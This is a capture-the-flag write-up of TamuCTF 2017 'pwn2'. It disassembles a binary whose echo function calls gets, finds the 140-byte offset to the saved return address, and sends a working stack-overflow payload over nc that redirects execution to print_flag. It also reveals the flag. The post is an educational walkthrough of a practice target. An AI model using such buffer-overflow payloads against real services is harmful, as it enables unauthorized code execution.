---
author:
  email: tzaoh1@gmail.com
  github: https://github.com/tzaoh
  image:
  - /images/avatar-64x64.png
  name:
  - Tzaoh
cardbackground: 'white'
cardtitlecolor: 'orange'
post_categories:
- CTFs
date: 2017-08-09T18:56:18+02:00
description: TamuCTF 2017 - pwn2
tags:
- CTF
- TamuCTF
- 2017
title: "TamuCTF 2017 - Pwn 2"
summary: "We are given a source code file and a binary which is being run remotely. Let's analyze it with radare2."
cardthumbimage: "/assets/TamuCTF2017/title.png"
---

![Pwn2 challenge description](/assets/TamuCTF2017/pwn2/1-pwn2_description.png)

We are given a source code file and a binary which is being run remotely.
Let's a analyze it with radare2:

```bash
$ wget https://github.com/BlackHoods/BlackHoods.github.io/raw/master/assets/TamuCTF2017/pwn2/pwn2
$ r2 pwn2
```

{{< highlight r2 "hl_lines=34 35 36" >}}
[0x08048450]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[x] Use -AA or aaaa to perform additional experimental analysis.
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[0x08048450]> afl
0x08048390    3 35           sym._init
0x080483b3    1 25           fcn.080483b3
0x080483cc    1 4            sub.gets_12_3cc
0x080483d0    1 6            sym.imp.gets
0x080483d6    2 10   -> 22   fcn.080483d6
0x080483e0    1 6            sym.imp._IO_getc
0x080483e6    2 10   -> 22   fcn.080483e6
0x080483f0    1 6            sym.imp.puts
0x080483f6    2 10   -> 22   fcn.080483f6
0x08048400    1 6            sym.imp.__libc_start_main
0x08048406    2 10   -> 22   fcn.08048406
0x08048410    1 6            sym.imp.setvbuf
0x08048416    2 10   -> 22   fcn.08048416
0x08048420    1 6            sym.imp.fopen
0x08048426    2 10   -> 22   fcn.08048426
0x08048430    1 6            sym.imp.putchar
0x08048436    2 10   -> 22   fcn.08048436
0x08048440    1 1            sub.__gmon_start___252_440
0x08048441    1 15           fcn.08048441
0x08048450    1 33           entry0
0x08048471    1 1            fcn.08048471
0x08048480    1 4            sym.__x86.get_pc_thunk.bx
0x08048490    4 43           sym.deregister_tm_clones
0x080484bc    4 57           fcn.080484bc
0x080484f5    3 41           fcn.080484f5
0x08048520    8 43   -> 93   sym.frame_dummy
0x0804854b    4 103          sym.print_flag
0x080485b2    1 84           sym.echo
0x08048606    1 36           sym.main
0x08048630    4 93           sym.__libc_csu_init
0x0804868d    1 5            fcn.0804868d
0x08048692    1 22           fcn.08048692
{{< /highlight >}}

We can see similar functions to the [previous]({{< relref "post/TamuCTF2017/pwn1.md" >}}) pwning challenge, but there a complication here: if we look closely...

```r2
[0x080485c0]> s sym.print_flag 
[0x0804854b]> axt
[0x0804854b]>
```
On the contrary to the pwn1 challenge `print_flag` function (which is responsible for printing the flag stored in `flag.txt`) is **never** called!  
Instead a new function named `echo` is called from `main` function.

{{< highlight r2 "hl_lines=14" >}}
[0x08048450]> pdf @ main
            ;-- main:
┌ (fcn) sym.main 36
│   sym.main ();
│           ; var int local_4h @ esp+0x4
│              ; DATA XREF from 0x08048467 (entry0)
│           0x08048606      8d4c2404       ecx = [local_4h]
│           0x0804860a      83e4f0         esp &= 0xfffffff0
│           0x0804860d      ff71fc         push dword [ecx - 4]
│           0x08048610      55             push ebp
│           0x08048611      89e5           ebp = esp
│           0x08048613      51             push ecx
│           0x08048614      83ec04         esp -= 4
│           0x08048617      e896ffffff     sym.echo ()
│           0x0804861c      b800000000     eax = 0
│           0x08048621      83c404         esp += 4
│           0x08048624      59             pop ecx
│           0x08048625      5d             pop ebp
│           0x08048626      8d61fc         esp = [ecx - 4]
└           0x08048629      c3             
{{< /highlight >}}

Lets see what it does:

{{< highlight r2 "hl_lines=20" >}}
[0x08048450]> pdf @ sym.echo
┌ (fcn) sym.echo 84
│   sym.echo ();
│           ; var int local_88h @ ebp-0x88
│              ; CALL XREF from 0x08048617 (sym.main)
│           0x080485b2      55             push ebp
│           0x080485b3      89e5           ebp = esp
│           0x080485b5      81ec88000000   esp -= 0x88
│           0x080485bb      a130a00408     eax = dword obj.stdout
│           0x080485c0      6a00           push 0
│           0x080485c2      6a00           push 0
│           0x080485c4      6a02           push 2
│           0x080485c6      50             push eax
│         ; int setvbuf(FILE*stream, char*buf, int mode, size_t size)
│           0x080485c7      e844feffff     sym.imp.setvbuf ()
│           0x080485cc      83c410         esp += 0x10
│           0x080485cf      83ec0c         esp -= 0xc
│           0x080485d2      68dd860408     push str.Enter_a_word_to_be_echoed:
│         ; int puts(const char *s)
│           0x080485d7      e814feffff     sym.imp.puts ()             
│         ; int puts(const char * s)
│           0x080485dc      83c410         esp += 0x10
│           0x080485df      83ec0c         esp -= 0xc
│           0x080485e2      8d8578ffffff   eax = [local_88h]
│           0x080485e8      50             push eax
│         ; char*gets(char *s)
│           0x080485e9      e8e2fdffff     sym.imp.gets ()             
│           0x080485ee      83c410         esp += 0x10
│           0x080485f1      83ec0c         esp -= 0xc
│           0x080485f4      8d8578ffffff   eax = [local_88h]
│           0x080485fa      50             push eax
│         ; int puts(const char *s)
│           0x080485fb      e8f0fdffff     sym.imp.puts ()
│           0x08048600      83c410         esp += 0x10
│           0x08048603      90
│           0x08048604      c9
└           0x08048605      c3
{{< /highlight >}}

Ok, so aparently it just prints back whatever you input before. But hey! To read your input it uses `gets` insecure function again!  That means we can write beyond the allocated memory of our input.

> All right, but this case is not like the previous one!  
> We do not want to change the value of a variable, but to call an existent function!  
> Is it possible?

Hell yeah! but to know how, we first need to understand how the stack is affected when calling a function (`sym.echo` in this case).
When a function is going to be called, some data is pushed on top of the stack. Among other things, the EIP register is stored.

> Why this register? Why is it special?

The purpose of EIP register (or instruction pointer) is to indicate the CPU which instruction has to be executed after the current one. When the `echo` function finishes, the CPU will need to continue the execution right after the call.  
Like this:

![Pwn2 Normal execution flow](/assets/TamuCTF2017/pwn2/4-pwn2_normal_flow.png)    

And the stack will look like:

![Pwn2 Stack view on echo call](/assets/TamuCTF2017/pwn2/5-pwn2_stack_view.png)    

Nice :v:!, looking at the stack we realize we could just write a bunch of bytes until we reach the `Saved EIP` value!

> Okay but ... how many bytes do we have to write?

Well, in this case we can calculate it like `0x88h + 4d(EBP length) = 140d`, but lets calculate another way: using gdb (GNU Debugger).

```bash
$ python -c 'print("A"*500)' > input.txt    # Generate and save a long string in a text file.                     
$ gdb -q pwn2                               # Open the binary with gdb.
Reading symbols from pwn2...(no debugging symbols found)...done.
(gdb) run < input.txt                       # Run the binary with the generated string.
Starting program: pwn2 < input.txt
Enter a word to be echoed:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb)
```

We ran the binary with gdb and passed 500 "A"s as input.
That `0x41414141` means that we have overwritten EIP register with value "AAAA" and the process crashed when it tried to execute the instrucction of that address (obviously there is nothing there).

So now we could just create a custom string like "abcdef...." to figure out which part of the string is being used to overwrite the EIP ... OR we can use a script which generates it for us :grin:.

Now is when is handy to know `pwntools` utils for python (to install just do
`pip install pwntools`) and more specifically its
`cyclic` utility. `cyclic` is able to generate a sequence of unique substrings of any length (4 by default).

Lets try it!

```bash
$ pwn cyclic 500 > input.txt  # String of 500 chars with unique substrings of 4 characters.
$ gdb -q pwn2
Reading symbols from pwn2...(no debugging symbols found)...done.
(gdb) run < input.txt 
Starting program: pwn2 < input.txt
Enter a word to be echoed:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae

Program received signal SIGSEGV, Segmentation fault.
0x6261616b in ?? ()
(gdb) 

```

To check that value we do:
```bash
$ pwn cyclic -l 0x6261616b
140
```

And finally, after those 140 characters we can write an address to continue the execution. Which address? the address of the `print_flag` function, of course! The new execution flow will look like this:

![Pwn2 Modified execution flow](/assets/TamuCTF2017/pwn2/8-pwn2_modified_flow.png) 

Lets get our flag:
```bash
$ python -c 'print("A"*140 + "\x4b\x85\x04\x08")' | nc pwn.ctf.tamu.edu 4321 
Enter a word to be echoed:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAK�
This function has been deprecated
gigem{D34D_FUNC_R1S1NG}
```

Answer: gigem{D34D_FUNC_R1S1NG}

### Complete video

<a href="https://asciinema.org/a/e8oyx42bm4nbs5stm33o4x24s?autoplay=1"><img src="https://asciinema.org/a/e8oyx42bm4nbs5stm33o4x24s.png" width="400"/></a>

### Tools used:

 * [radare2](https://github.com/radare/radare2) - To analyze the binary.
 * [gdb](https://www.gnu.org/software/gdb/) - For binary debugging.
 * [pwntools](https://github.com/Gallopsled/pwntools) and [cyclic](http://docs.pwntools.com/en/stable/util/cyclic.html#pwnlib.util.cyclic.cyclic) - To generate unique substrings.
 * [draw.io](https://www.draw.io/) - To draw some graphics.
 * [asciinema](https://asciinema.org) - To record the session.
